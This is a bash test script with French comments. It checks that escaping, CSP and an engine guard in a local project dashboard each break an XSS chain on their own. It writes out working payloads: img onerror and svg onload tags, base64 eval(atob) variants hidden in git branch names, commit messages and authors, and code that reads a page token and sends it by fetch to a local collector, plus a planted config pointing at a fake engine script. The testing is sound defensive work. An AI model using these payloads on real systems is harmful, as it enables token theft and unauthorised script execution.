#!/usr/bin/env bash
# test-cockpit-chaine-xss.sh — la chaîne « lab piégé -> script dans la page -> jeton -> POST /api/plan/undo -> script du lab »
# (audit 67-SECURITY B1+B2, M5). Trois maillons, chacun doit la casser SEUL :
#   échappement des champs du graphe · CSP · garde du moteur (jamais un script désigné par le lab).
# Lab piégé : un PLAN.md dont `wave:` porte une balise <img onerror> (rendue dans le pied de carte), un
# .cache/skill.json et un .cache/history/ plantés qui désignent un faux moteur (evil/scripts/plan.mjs écrit un marqueur).
# Navigateur : Chrome headless (CDP, WebSocket de node) quand il existe ($CHROME_BIN, macOS, google-chrome, chromium) ;
# sinon SIMULATION FIDÈLE : le rendu du pied de carte est rejoué par node (cardFoot extrait de la page servie), les
# en-têtes sont lus sur la réponse, et la charge du navigateur (lire le jeton, POST /api/plan/undo) est jouée par un client node.
# Mutants (le code muté vit dans une copie du module ; les pages mutées, dans une copie de la sortie) : M-ESC retire h() du pied de carte, M-CSP neutralise les en-têtes
# Content-Security-Policy, M-GARDE rend à skillScript la lecture de .cache/skill.json.
#   C0 témoin : les trois maillons retirés -> la chaîne ABOUTIT (script du lab exécuté, jeton reçu par l'origine tierce)
#   C1 code livré : rien n'aboutit · C2 échappement seul · C3 CSP seule · C4 garde seule
# CHAINE_SEUL=temoin : ne joue que C0 (mesure « avant » sur un module antérieur aux correctifs).
# Volet terminal intégré (Phase 71, TERM-12) : test-cockpit-terminal-xss.sh (même lab piégé, chaîne prolongée jusqu'au serveur du terminal).
# Volet GIT (Phase 78, P78-D-17 ; T-78-43) : les DONNÉES d'un dépôt (nom de branche `<svg/onload=…>`, message de commit `<img onerror=…>`, auteur, message de stash)
# sont une entrée hostile de plus pour le tiroir Git. Même chaîne (script dans la page -> jeton -> POST /api/plan/undo -> script du lab), même faux moteur, mêmes
# mutants de CSP et de garde ; le maillon « échappement » est ici le rendu en textContent des fichiers 77 (M-GIT-TEXTE : innerHTML dans la copie de la sortie).
#   C0g témoin (M-GIT-TEXTE + M-CSP + M-GARDE) -> la chaîne ABOUTIT · C1g code livré : rien n'aboutit · C2g textContent seul · C3g CSP seule · C4g garde seule
# Sans navigateur le volet git est SAUTÉ et compté comme tel (jamais réussi) : une donnée git ne se rend que dans une page.
# Volet ACTIVITÉ (Phase 75, ACTV-12) : chemin de fichier, nom de branche, rôle et description d'agent hostiles ; voir le volet plus bas (C0a à C4a, Q1.2).
# Exit 0 si tout passe, 1 sinon.

set -uo pipefail
export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null
SCRIPTS="$(cd "$(dirname "$0")/.." && pwd)"
WORK="$(mktemp -d)"; WORK="$(cd "$WORK" && pwd -P)"; AUX="$WORK/aux"; mkdir -p "$AUX" "$WORK/home"
export REAL_HOME="$HOME"; export HOME="$WORK/home"
export CHROME_SESSION="$(cd "$(dirname "$0")" && pwd)/chrome-session.mjs"
libre() { node -e "const s=require('net').createServer().listen(0,'127.0.0.1',()=>{console.log(s.address().port);s.close()})"; } # port libre choisi à l'exécution
PIDS=()
cleanup() { vf_hyg_fin; [ -n "${KEEP:-}" ] || rm -rf "$WORK"; }
trap cleanup EXIT
. "$(dirname "$0")/hygiene.sh"; vf_hyg_init
. "$(dirname "$0")/socle-serveur.sh"

PASS=0; FAIL=0; SKIP=0
skip() { echo "  ⏭️  SAUTÉ — $1 ($2)"; SKIP=$((SKIP+1)); }
assert_eq() { if [ "$2" = "$3" ]; then echo "  ✅ PASS — $1"; PASS=$((PASS+1)); else echo "  ❌ FAIL — $1"; echo "     attendu: [$3]"; echo "     obtenu:  [$2]"; FAIL=$((FAIL+1)); fi; }

CHROME=""
for c in "${CHROME_BIN:-}" "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" google-chrome google-chrome-stable chromium chromium-browser; do
  [ -n "$c" ] || continue
  if [ -x "$c" ] || command -v "$c" >/dev/null 2>&1; then CHROME="$c"; break; fi
done
[ -n "${CHAINE_SANS_NAVIGATEUR:-}" ] && CHROME=""
echo "navigateur : ${CHROME:-aucun (simulation fidèle)}"

# --- aides node ---
cat > "$AUX/collect.mjs" <<'JS'
// collect.mjs <port> <fichier> : origine tierce ; chaque requête reçue est consignée (ligne = chemin)
import http from 'node:http'; import fs from 'node:fs';
http.createServer((q, r) => { fs.appendFileSync(process.argv[3], q.url + '\n'); r.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); r.end('ok'); }).listen(Number(process.argv[2]), '127.0.0.1');
JS
cat > "$AUX/req.mjs" <<'JS'
// req.mjs <port> <méthode> <chemin> [jeton] : statut, en-têtes (JSON), corps
import http from 'node:http';
const [, , port, method, p, token] = process.argv;
const headers = { Host: `127.0.0.1:${port}`, ...(token ? { 'x-vf-cockpit-token': token } : {}) };
const r = http.request({ host: '127.0.0.1', port: Number(port), path: p, method, headers }, (res) => { let b = ''; res.on('data', (c) => (b += c)); res.on('end', () => { console.log(res.statusCode); console.log(JSON.stringify(res.headers)); process.stdout.write(b); }); });
r.on('error', (e) => console.log('ERR ' + e.message)); r.end();
JS
cat > "$AUX/browser.mjs" <<'JS'
// browser.mjs <chrome> <url> <graceMs> : ouvre la page en Chrome headless (socle chrome-session.mjs), rend { charges, cartes, violations }
// charges = éléments portant un attribut onerror dans le DOM rendu (la charge du lab est-elle devenue du HTML ?)
// La page est relevée quand elle est PRÊTE (load + au moins une carte dessinée), jamais après un délai fixe ; mesure indisponible -> { erreur } nommée.
import { pathToFileURL } from 'node:url';
const { executer, pause } = await import(pathToFileURL(process.env.CHROME_SESSION).href);
const [, , chrome, url, grace] = process.argv;
await executer(chrome, async (s) => {
  await s.naviguer(url); await s.attendre("document.readyState === 'complete' && document.querySelectorAll('.card').length >= 1", 'cartes dessinées'); await pause(Number(grace) || 0);
  return { charges: await s.ev('document.querySelectorAll("[onerror]").length'), cartes: await s.ev('document.querySelectorAll(".card").length'), violations: [...s.violations] };
}, { csp: true });
JS
cat > "$AUX/simul.mjs" <<'JS'
// simul.mjs <port> : sans navigateur. Rejoue cardFoot (extrait de la page Projet servie) sur la charge du lab ; rend { charges }
import http from 'node:http';
const port = process.argv[2];
http.get({ host: '127.0.0.1', port: Number(port), path: '/project.html', headers: { Host: `127.0.0.1:${port}` } }, (r) => {
  let html = ''; r.on('data', (c) => (html += c)); r.on('end', () => {
    const h = /const h = \(s\) => [^\n]*/.exec(html)?.[0], i = html.indexOf('function cardFoot(item)');
    if (!h || i < 0) { console.log(JSON.stringify({ erreur: 'cardFoot introuvable' })); return; }
    let j = html.indexOf('\n}\n', i) + 3; const src = html.slice(i, j);
    const g = JSON.parse(html.slice(html.indexOf('window.VF_COCKPIT = ') + 20, html.indexOf(';</script>', html.indexOf('window.VF_COCKPIT = '))));
    const plan = g.files.find((f) => /onerror/.test(f.foot || ''));
    const fn = new Function('item', 'info', 'plural', 'statsOf', 'kids', 'routesByFile', 'recentOf', 'recentIn', 'recentLabel', h + '\n' + src + '\nreturn cardFoot(item);');
    const out = plan ? fn('f:x', () => ({ type: 'file', f: plan }), (n, w) => n + ' ' + w, () => ({ files: 0 }), new Map(), new Map(), () => null, new Map(), () => '') : '';
    console.log(JSON.stringify({ charges: /<img[^>]*onerror/i.test(out) ? 1 : 0, donnee: !!plan }));
  });
});
JS
jq_() { node -e "const j=JSON.parse(require('fs').readFileSync(0,'utf8'));const v=(function(j){return ($1)})(j);console.log(typeof v==='string'?v:JSON.stringify(v))"; }

# --- lab piégé ---
COLL_PORT="$(libre)"; COLL_LOG="$WORK/collecteur.log"; : > "$COLL_LOG"
node "$AUX/collect.mjs" "$COLL_PORT" "$COLL_LOG" & PIDS+=($!)
PAYLOAD="<img src=x onerror=fetch('/api/plan/undo',{method:'POST',headers:{'x-vf-cockpit-token':VF_COCKPIT_SERVER.token}});fetch('http://127.0.0.1:$COLL_PORT/?t='+VF_COCKPIT_SERVER.token)>"
LAB="$WORK/lab"; mkdir -p "$LAB/src" "$LAB/.planning/phases/01-x" "$LAB/evil/scripts"
printf 'export const util = () => 1;\n' > "$LAB/src/util.js"
printf -- '- [ ] **Phase 1: Socle** - premier jet\n' > "$LAB/.planning/ROADMAP.md"
printf -- '---\nwave: %s\n---\n<objective>Faire le socle</objective>\n' "$PAYLOAD" > "$LAB/.planning/phases/01-x/01-01-PLAN.md"
for s in plan build; do printf "import fs from 'node:fs'; fs.writeFileSync(%s,'executé par le serveur');\n" "'$WORK/MARQUEUR-SCRIPT-DU-LAB'" > "$LAB/evil/scripts/$s.mjs"; done
git -C "$LAB" init -q && git -C "$LAB" add -A && git -C "$LAB" -c user.email=t@t -c user.name=t commit -q -m init
node "$SCRIPTS/vf-cockpit-build.mjs" "$LAB" --quiet > "$WORK/build.out" 2>&1 || cat "$WORK/build.out"
SORTIE="$LAB/.vibeflow/cockpit"
# l'état « piégé » du lab, planté dans la sortie : le faux moteur désigné et un historique de plan
plante() { # $1 = sortie
  mkdir -p "$1/.cache/history/a"; printf '{"dir":"%s"}\n' "$LAB/evil" > "$1/.cache/skill.json"; printf '{}\n' > "$1/.cache/history/a/plan.json"; }

# mutant <sortie> <M-ESC|M-CSP|M-GARDE> : applique le mutant ; échoue si rien n'a changé (jamais un mutant sans effet)
# 79-06 : la sortie (o) ne porte que des pages ; serve.mjs muté vit dans une COPIE du module (MUT_MOD, une par manche, mutée sur place)
MUT_OUT=""; MUT_MOD=""
pages_mod() { local a="$MUT_MOD/skills/cockpit-moteur/assets"; cat "$a/viewer.html" "$a"/ui/*.js; } # 79-16 : les sources de page sont celles de la copie du module (la sortie ne porte que des données)
mutant() {
  local o="$1" m="$2" sv="$MUT_MOD/skills/cockpit-moteur/assets/serve.mjs" before after
  before="$({ cat "$sv"; pages_mod; } | cksum)"
  case "$m" in
    M-ESC) cockpit_page_muter_dans "$MUT_MOD" 's#<span class="meta">${h(size)}</span>#<span class="meta">${size}</span>#' 2>/dev/null ;;
    M-CSP) sed -i.bak "s#res.setHeader('Content-Security-Policy'#res.setHeader('X-Mutant-Csp'#g" "$sv" ;;
    M-GIT-TEXTE) cockpit_page_muter_dans "$MUT_MOD" "s#if (txt != null) e.textContent = String(txt);#if (txt != null) e.innerHTML = String(txt);#; s#corpsMsg.textContent = m.length#corpsMsg.innerHTML = m.length#" 2>/dev/null
      [ "$(pages_mod | grep -c 'e.innerHTML = String(txt);')" = 1 ] && [ "$(pages_mod | grep -c 'corpsMsg.innerHTML = m.length')" = 1 ] || { echo "  ❌ mutant M-GIT-TEXTE incomplet dans les sources de page du module" >&2; return 1; } ;;
    M-TEXTE-ACT) cockpit_page_muter_dans "$MUT_MOD" "s#if (txt !== undefined) e.textContent = txt;#if (txt !== undefined) e.innerHTML = txt;#" 2>/dev/null
      [ "$(pages_mod | grep -c 'e.innerHTML = txt;')" -ge 1 ] || { echo "  ❌ mutant M-TEXTE-ACT incomplet dans les sources de page du module" >&2; return 1; } ;;
    M-GARDE) sed -i.bak "s#const dir = engineDirFromLauncher();#let dir; try { dir = JSON.parse(fs.readFileSync(path.join(here, '.cache', 'skill.json'), 'utf8')).dir; } catch {}#; s#^try { fs.rmSync(path.join(here, '.cache', 'skill.json')#if (false) try { fs.rmSync(path.join(here, '.cache', 'skill.json')#" "$sv" ;;
  esac
  after="$({ cat "$sv"; pages_mod; } | cksum)"
  [ "$before" != "$after" ] || { echo "  ❌ mutant $m sans effet (motif absent du module ou de la sortie)" >&2; return 1; }
}

# manche <étiquette> <mutants...> : sortie copiée, mutants posés, serveur lancé, page ouverte, effets relevés
# résultat : variables R_CHARGES R_MARQUEUR R_EXFIL R_UNDO
manche() {
  local label="$1"; shift
  # 79-06 : serve.mjs exige --sortie=<lab>/.vibeflow/cockpit (chemin réel) : chaque manche a sa copie du lab, la sortie copiée est celle de cette copie
  local L="$WORK/lab-$label"; rm -rf "$L"; cp -R "$LAB" "$L"; local o="$L/.vibeflow/cockpit"; plante "$o"
  MUT_OUT="$o"; rm -rf "$WORK/mod-$label"; MUT_MOD="$(cockpit_module_copie "$WORK/mod-$label")" || { R_CHARGES="copie-du-module-impossible"; return; }
  # le module d'exécution du lab piégé vit sous <lab>/.vibeflow/cockpit : les copies tournent dans leur propre dossier
  local m; for m in "$@"; do mutant "$o" "$m" || { R_CHARGES="mutant-sans-effet"; return; }; done
  rm -f "$WORK/MARQUEUR-SCRIPT-DU-LAB"; : > "$COLL_LOG"
  COCKPIT_MODULE="$MUT_MOD" COCKPIT_SORTIE="$o" COCKPIT_LOG="$WORK/serve-$label.out" cockpit_lancer "$L" VF_COCKPIT_ENGINE_DIR="$MUT_MOD/skills/cockpit-moteur" VF_COCKPIT_SCRIPTS_DIR="$MUT_MOD/scripts" || true
  local pid="$VF_PID"
  local port="$VF_PORT"
  local res
  if [ -n "$CHROME" ]; then
    res="$(node "$AUX/browser.mjs" "$CHROME" "http://127.0.0.1:$port/project.html#v=n:ph-1" 1500)"
    R_VIOL="$(printf '%s' "$res" | jq_ 'j.violations.length')"; R_CARTES="$(printf '%s' "$res" | jq_ 'j.cartes')"
    R_CODE="$(node "$AUX/browser.mjs" "$CHROME" "http://127.0.0.1:$port/index.html" 1500)"
  else
    res="$(node "$AUX/simul.mjs" "$port")"
    # charge jouée par le client : le jeton de la page (si la page l'a), POST, exfiltration (bloquée seulement par la CSP)
    if [ "$(printf '%s' "$res" | jq_ 'j.charges')" = "1" ]; then
      local tok csp; tok="$(node "$AUX/req.mjs" "$port" GET /project.html | sed -n '3,$p' | sed -n 's/.*VF_COCKPIT_SERVER={"token":"\([0-9a-f]*\)".*/\1/p' | head -1)"
      csp="$(node "$AUX/req.mjs" "$port" GET /project.html | sed -n 2p | jq_ 'j["content-security-policy"]||""')"
      # un gestionnaire en ligne (onerror=) ne s'exécute que si la CSP n'a pas de script-src, ou si celle-ci admet 'unsafe-inline'
      local ssrc; ssrc="$(printf '%s' "$csp" | tr ';' '\n' | grep -E '^ *script-src' || true)"
      if [ -n "$ssrc" ]; then case "$ssrc" in *"'unsafe-inline'"*) : ;; *) tok="" ;; esac; fi
      if [ -n "$tok" ]; then
        node "$AUX/req.mjs" "$port" POST /api/plan/undo "$tok" > /dev/null
        case "$csp" in *"connect-src 'self'"*) : ;; *) node -e "fetch('http://127.0.0.1:$COLL_PORT/?t=$tok').catch(()=>0)"; sleep 0.5 ;; esac
      fi
    fi
  fi
  # les effets de la charge (script du lab, jeton chez l'origine tierce) arrivent de façon asynchrone : on les ATTEND quand la manche doit
  # les voir (échéance VF_CDP_ECHEANCE_S, 60 s), on laisse seulement une courte grâce quand elle doit constater leur absence
  local want=""; case "$label" in temoin) want="marq exfil" ;; garde) want="exfil" ;; esac
  local fin=$((SECONDS + ${VF_CDP_ECHEANCE_S:-60}))
  while [ "$SECONDS" -lt "$fin" ]; do
    local ok=1
    case " $want " in *" marq "*) [ -f "$WORK/MARQUEUR-SCRIPT-DU-LAB" ] || ok=0 ;; esac
    case " $want " in *" exfil "*) grep -q '?t=[0-9a-f]\{16,\}' "$COLL_LOG" || ok=0 ;; esac
    [ "$ok" = 1 ] && break; [ -z "$want" ] && break; sleep 0.2
  done
  sleep 1
  vf_hyg_stop "$pid"
  R_CHARGES="$(printf '%s' "$res" | jq_ 'j.charges')"
  R_MARQUEUR=non; [ -f "$WORK/MARQUEUR-SCRIPT-DU-LAB" ] && R_MARQUEUR=oui
  R_EXFIL=non; grep -q '?t=[0-9a-f]\{16,\}' "$COLL_LOG" && R_EXFIL=oui
  echo "     [$label] mesure : charge-dans-le-DOM=$R_CHARGES script-du-lab-exécuté=$R_MARQUEUR jeton-reçu-par-l'origine-tierce=$R_EXFIL ${res:0:200}"
}

echo "=== C0 — témoin : les trois maillons retirés, la chaîne doit ABOUTIR ==="
manche temoin M-ESC M-CSP M-GARDE 2>/dev/null || true
if [ "${R_CHARGES:-}" = "mutant-sans-effet" ]; then
  # module antérieur aux correctifs : rien à muter, la sortie EST le témoin
  manche temoin
fi
assert_eq "C0.1 — la charge du lab devient du HTML dans la page" "$([ "${R_CHARGES:-0}" -ge 1 ] 2>/dev/null && echo oui || echo non)" "oui"
assert_eq "C0.2 — le script désigné par le lab a été exécuté par POST /api/plan/undo" "$R_MARQUEUR" "oui"
assert_eq "C0.3 — le jeton est arrivé à l'origine tierce" "$R_EXFIL" "oui"
if [ "${CHAINE_SEUL:-}" = "temoin" ]; then echo "  (CHAINE_SEUL=temoin : seules les mesures « avant » sont jouées)"; else
echo "=== C1 — code livré : la chaîne n'aboutit nulle part ==="
manche livre
assert_eq "C1.1 — aucune balise de la charge dans le DOM rendu" "$R_CHARGES" "0"
assert_eq "C1.2 — aucun script du lab exécuté" "$R_MARQUEUR" "non"
assert_eq "C1.3 — aucun jeton reçu par l'origine tierce" "$R_EXFIL" "non"
if [ -n "$CHROME" ]; then
  assert_eq "C1.4 — la page Projet rendue sous la CSP : aucune violation" "$R_VIOL" "0"
  assert_eq "C1.5 — la page Projet rendue sous la CSP : des cartes dessinées (la page fonctionne)" "$([ "${R_CARTES:-0}" -ge 1 ] 2>/dev/null && echo oui || echo non)" "oui"
  assert_eq "C1.6 — la page Code sous la CSP : aucune violation et des cartes" "$(printf '%s' "$R_CODE" | jq_ 'j.violations.length === 0 && j.cartes >= 1')" "true"
fi

echo "=== C2 — échappement SEUL (CSP et garde retirées) : la charge n'atteint pas le DOM ==="
manche esc M-CSP M-GARDE
assert_eq "C2.1 — maillon rompu : 0 charge dans le DOM" "$R_CHARGES" "0"
assert_eq "C2.2 — aucun script du lab exécuté" "$R_MARQUEUR" "non"
assert_eq "C2.3 — aucun jeton exfiltré" "$R_EXFIL" "non"

echo "=== C3 — CSP SEULE (échappement et garde retirés) : la balise existe, son code ne s'exécute pas ==="
manche csp M-ESC M-GARDE
assert_eq "C3.1 — témoin : la charge est bien dans le DOM (l'échappement est retiré)" "$([ "${R_CHARGES:-0}" -ge 1 ] 2>/dev/null && echo oui || echo non)" "oui"
assert_eq "C3.2 — maillon rompu : aucun script du lab exécuté (le fetch inline est bloqué)" "$R_MARQUEUR" "non"
assert_eq "C3.3 — aucun jeton exfiltré" "$R_EXFIL" "non"

echo "=== C4 — garde .cache SEULE (échappement et CSP retirés) : tout s'exécute SAUF le script du lab ==="
manche garde M-ESC M-CSP
assert_eq "C4.1 — témoin : la charge est dans le DOM" "$([ "${R_CHARGES:-0}" -ge 1 ] 2>/dev/null && echo oui || echo non)" "oui"
assert_eq "C4.2 — témoin : le jeton est exfiltré (la CSP est retirée)" "$R_EXFIL" "oui"
assert_eq "C4.3 — maillon rompu : le script désigné par le lab n'est PAS exécuté" "$R_MARQUEUR" "non"

# C5 — O3 (recette 3, arbitrage Samuel, AskUserQuestion session principale, 2026-11-03) : le rendu *italique* / _italique_ des réponses de l'agent (VibeFlow.md) s'applique APRÈS l'échappement.
# Une balise entre marqueurs, y compris la charge de ce lab, reste du texte : insérée dans la page servie sous sa CSP, aucun élément onerror, aucune violation, et le texte brut figure dans le DOM.
if [ -n "$CHROME" ]; then
echo "=== C5 — l'italique rendu ne rouvre pas la porte : *<img onerror>* reste du texte sous la CSP ==="
cat > "$AUX/italique.mjs" <<'JS'
import { pathToFileURL } from 'node:url';
const { executer } = await import(pathToFileURL(process.env.CHROME_SESSION).href);
const [, , chrome, url] = process.argv;
await executer(chrome, async (s) => {
  await s.naviguer(url); await s.attendre("document.readyState === 'complete' && !!window.VibeFlow && !!window.VibeFlow.md", 'rendu md disponible');
  return await s.ev(`(() => { const d = document.createElement('div'); d.id = 'c5';
    d.innerHTML = window.VibeFlow.md('*<img src=x onerror=document.title=1>* puis _<svg onload=document.title=2>_ et **<b onclick=1>x</b>** *ok*'); document.body.appendChild(d);
    return { charges: document.querySelectorAll('#c5 [onerror], #c5 [onload], #c5 [onclick], #c5 img, #c5 svg, #c5 b').length, texte: d.textContent, em: d.querySelectorAll('em').length, titre: document.title }; })()`)
    .then(async (r) => ({ ...r, violations: [...s.violations] }));
}, { csp: true });
JS
COCKPIT_LOG="$WORK/serve-c5.out" cockpit_lancer "$LAB" VF_COCKPIT_ENGINE_DIR="$SCRIPTS/../skills/cockpit-moteur" VF_COCKPIT_SCRIPTS_DIR="$SCRIPTS" || true
pid5="$VF_PID"
port5="$VF_PORT"
X5="$(node "$AUX/italique.mjs" "$CHROME" "http://127.0.0.1:$port5/project.html")"; vf_hyg_stop "$pid5"
assert_eq "C5.1 — la charge entre marqueurs ne devient aucun élément (img, svg, b, onerror, onload, onclick)" "$(printf '%s' "$X5" | jq_ '(j.erreur||"")+"|"+j.charges')" "|0"
assert_eq "C5.2 — le texte de la charge est affiché tel quel et le titre de la page n'a pas bougé" "$(printf '%s' "$X5" | jq_ '[/<img src=x onerror=document.title=1>/.test(j.texte), /<svg onload=/.test(j.texte), j.titre!=="1"&&j.titre!=="2"]')" "[true,true,true]"
assert_eq "C5.3 — témoin : l'italique est bien rendu ailleurs dans la même réponse, aucune violation de CSP" "$(printf '%s' "$X5" | jq_ '[j.em>=1, j.violations.length]')" "[true,0]"
fi
fi

# ============================== Volet GIT (Phase 78) ==============================
if [ "${CHAINE_SEUL:-}" != "temoin" ]; then
echo "=== Volet git — données de dépôt hostiles : C0g à C4g ==="
if [ -z "$CHROME" ]; then skip "C0g à C4g (volet git)" "pas de navigateur : une donnée git ne se rend que dans une page"; else
GT() { git -c user.email=t@t.test -c user.name=t "$@"; }
# charge sans espace, deux-points ni point d'interrogation (interdits dans un nom de branche) : eval(atob(<base64>)) ; le base64 ne doit contenir ni « / » ni « + » inutiles
PAYLOAD_JS="fetch('/api/plan/undo',{method:'POST',headers:{'x-vf-cockpit-token':VF_COCKPIT_SERVER.token}})"
B64="$(printf '%s' "$PAYLOAD_JS" | base64 | tr -d '\n')"
ATOB="eval(atob('$B64'))"
BRANCHE="<svg/onload=$ATOB>"
MESSAGE="<img src=x onerror=$ATOB>"
AUTEUR="x\"/onfocus=$ATOB/autofocus/a=\""
LABG="$WORK/labg"; mkdir -p "$LABG/src" "$LABG/.planning/phases/01-x" "$LABG/evil/scripts"
printf 'export const util = () => 1;\n' > "$LABG/src/util.js"
printf -- '- [ ] **Phase 1: Socle** - premier jet\n' > "$LABG/.planning/ROADMAP.md"
printf -- '---\nstatus: executing\nmilestone: vibeflow-test\n---\n# State\n' > "$LABG/.planning/STATE.md"
printf '<objective>Faire le socle</objective>\n' > "$LABG/.planning/phases/01-x/01-01-PLAN.md"
for s in plan build; do printf "import fs from 'node:fs'; fs.writeFileSync(%s,'executé par le serveur');\n" "'$WORK/MARQUEUR-SCRIPT-DU-LAB'" > "$LABG/evil/scripts/$s.mjs"; done
GT -C "$LABG" init -q -b main; printf '.vibeflow\n' >> "$LABG/.git/info/exclude"; GT -C "$LABG" add -A; GT -C "$LABG" commit -q -m "init"
GT -C "$LABG" branch "$BRANCHE"
printf 'v\n' > "$LABG/src/v.js"; GT -C "$LABG" add -A
GIT_AUTHOR_NAME="$AUTEUR" GT -C "$LABG" commit -q -m "$MESSAGE" -m "corps : $MESSAGE"
printf 'w\n' >> "$LABG/src/v.js"; GT -C "$LABG" stash push -q -m "$MESSAGE"
GT -C "$LABG" tag "<svg/onload=$ATOB>t" 2>/dev/null || true
NHOSTILES="$(GT -C "$LABG" for-each-ref --format='%(refname)' refs/heads | grep -c 'onload=eval')"
assert_eq "Cg.0 — témoins du dépôt hostile : la branche, le message du commit de tête et le stash portent la charge (le dépôt n'est pas anodin)" "$NHOSTILES|$(GT -C "$LABG" log -1 --format=%s | grep -c 'onerror=eval')|$(GT -C "$LABG" stash list | grep -c 'onerror=eval')" "1|1|1"
node "$SCRIPTS/vf-cockpit-build.mjs" "$LABG" --quiet > "$WORK/build-g.out" 2>&1 || cat "$WORK/build-g.out"
SORTIE_G="$LABG/.vibeflow/cockpit"
cat > "$AUX/gitbrowser.mjs" <<'JS'
// gitbrowser.mjs <chrome> <url> : ouvre la page, ouvre le tiroir Git, déplie le détail du commit de tête (message hostile), rend { charges, rangees, violations }
// charges = éléments portant un attribut onerror, onload ou onfocus dans le tiroir : la donnée de git est-elle devenue du HTML ?
import { pathToFileURL } from 'node:url';
const { executer, pause } = await import(pathToFileURL(process.env.CHROME_SESSION).href);
const [, , chrome, url] = process.argv;
await executer(chrome, async (s) => {
  await s.naviguer(url);
  await s.attendre("document.readyState === 'complete' && !!window.VFGitTiroir && !!document.querySelector('#vf-git-ligne')", 'page et tiroir Git');
  await s.ev("window.VFGitTiroir.ouvrir()");
  await s.attendre("document.querySelectorAll('#vf-git-tiroir li[role=option]').length > 0", 'rangées du graphe');
  await s.ev("document.querySelector('#vf-git-tiroir li[role=option]').click()");
  await s.attendre("(() => { const r = document.querySelector('#vf-git-tiroir [role=region][aria-label^=\"Détail du commit\"]'); return !!r && r.textContent.length > 0 && !/Lecture du détail/.test(r.textContent); })()", 'détail du commit chargé');
  await pause(500);
  return { charges: await s.ev("document.querySelectorAll('#vf-git-tiroir [onerror], #vf-git-tiroir [onload], #vf-git-tiroir [onfocus]').length"),
    rangees: await s.ev("document.querySelectorAll('#vf-git-tiroir li[role=option]').length"), violations: [...s.violations] };
}, { csp: true });
JS
# manche_g <étiquette> <mutants…> : copie de la sortie DANS le lab (racine = deux niveaux au-dessus), mutants posés, serveur lancé, page ouverte, effets relevés
# résultat : R_CHARGES R_MARQUEUR R_ROWS R_VIOL
manche_g() {
  local label="$1"; shift
  local L="$WORK/labg-$label"; rm -rf "$L"; cp -R "$LABG" "$L"; local o="$L/.vibeflow/cockpit"   # 79-06 : serve.mjs exige --sortie=<lab>/.vibeflow/cockpit : une copie du lab par manche
  MUT_OUT="$o"; rm -rf "$WORK/mod-g-$label"; MUT_MOD="$(cockpit_module_copie "$WORK/mod-g-$label")" || { R_CHARGES="copie-du-module-impossible"; return; }
  mkdir -p "$o/.cache/history/a"; printf '{"dir":"%s"}\n' "$LABG/evil" > "$o/.cache/skill.json"; printf '{}\n' > "$o/.cache/history/a/plan.json"; rm -f "$o/.cache/server.json"
  local m; for m in "$@"; do mutant "$o" "$m" || { R_CHARGES="mutant-sans-effet"; return; }; done
  rm -f "$WORK/MARQUEUR-SCRIPT-DU-LAB"
  COCKPIT_MODULE="$MUT_MOD" COCKPIT_SORTIE="$o" COCKPIT_LOG="$WORK/serve-g-$label.out" cockpit_lancer "$L" VF_COCKPIT_ENGINE_DIR="$MUT_MOD/skills/cockpit-moteur" VF_COCKPIT_SCRIPTS_DIR="$MUT_MOD/scripts" || true
  local pid="$VF_PID"
  local port="$VF_PORT"
  local res; res="$(node "$AUX/gitbrowser.mjs" "$CHROME" "http://127.0.0.1:$port/")"
  local want=""; case "$label" in temoing) want="marq" ;; esac
  local fin=$((SECONDS + ${VF_CDP_ECHEANCE_S:-60}))
  while [ "$SECONDS" -lt "$fin" ]; do
    [ -z "$want" ] && break
    [ -f "$WORK/MARQUEUR-SCRIPT-DU-LAB" ] && break; sleep 0.2
  done
  sleep 1
  vf_hyg_stop "$pid"
  R_CHARGES="$(printf '%s' "$res" | jq_ 'j.charges')"; R_ROWS="$(printf '%s' "$res" | jq_ 'j.rangees')"; R_VIOL="$(printf '%s' "$res" | jq_ '(j.violations||[]).length')"
  R_MARQUEUR=non; [ -f "$WORK/MARQUEUR-SCRIPT-DU-LAB" ] && R_MARQUEUR=oui
  echo "     [$label] mesure : charge-dans-le-DOM=$R_CHARGES rangées=$R_ROWS violations=$R_VIOL script-du-lab-exécuté=$R_MARQUEUR ${res:0:160}"
}
oui_non() { [ "${1:-0}" -ge 1 ] 2>/dev/null && echo oui || echo non; }

echo "=== C0g — témoin : rendu en innerHTML (M-GIT-TEXTE), CSP neutralisée (M-CSP), garde retirée (M-GARDE) : la chaîne doit ABOUTIR ==="
manche_g temoing M-GIT-TEXTE M-CSP M-GARDE
assert_eq "C0g.1 — la branche, le message ou l'auteur du dépôt deviennent des éléments à gestionnaire d'événement dans le tiroir" "$(oui_non "$R_CHARGES")" "oui"
assert_eq "C0g.2 — le script désigné par le lab a été exécuté par POST /api/plan/undo : le marqueur existe (sinon la chaîne git est aveugle)" "$R_MARQUEUR" "oui"
echo "=== C1g — code livré : une donnée git hostile n'aboutit nulle part ==="
manche_g livreg
assert_eq "C1g.1 — aucun élément à gestionnaire dans le tiroir (textContent)" "$R_CHARGES" "0"
assert_eq "C1g.2 — aucun script du lab exécuté" "$R_MARQUEUR" "non"
assert_eq "C1g.3 — le tiroir fonctionne sous la CSP (des rangées, 0 violation)" "$(oui_non "$R_ROWS")|$R_VIOL" "oui|0"
echo "=== C2g — textContent SEUL (CSP et garde retirées) ==="
manche_g textg M-CSP M-GARDE
assert_eq "C2g.1 — maillon rompu : 0 élément à gestionnaire dans le tiroir" "$R_CHARGES" "0"
assert_eq "C2g.2 — aucun script du lab exécuté (le tiroir a pourtant des rangées)" "$R_MARQUEUR|$(oui_non "$R_ROWS")" "non|oui"
echo "=== C3g — CSP SEULE (rendu en innerHTML et garde retirés) : la balise existe, son code ne s'exécute pas ==="
manche_g cspg M-GIT-TEXTE M-GARDE
assert_eq "C3g.1 — témoin : la charge est bien dans le DOM (le rendu est en innerHTML)" "$(oui_non "$R_CHARGES")" "oui"
assert_eq "C3g.2 — maillon rompu : aucun script du lab exécuté (la CSP bloque le gestionnaire)" "$R_MARQUEUR" "non"
echo "=== C4g — garde .cache SEULE (rendu en innerHTML et CSP retirés) : le script part, mais celui du lab n'est PAS exécuté ==="
manche_g gardeg M-GIT-TEXTE M-CSP
assert_eq "C4g.1 — témoin : la charge est dans le DOM (rendu en innerHTML, CSP retirée)" "$(oui_non "$R_CHARGES")" "oui"
assert_eq "C4g.2 — maillon rompu : le script désigné par le lab n'est PAS exécuté (le moteur ne lit plus .cache/skill.json)" "$R_MARQUEUR" "non"
fi
fi

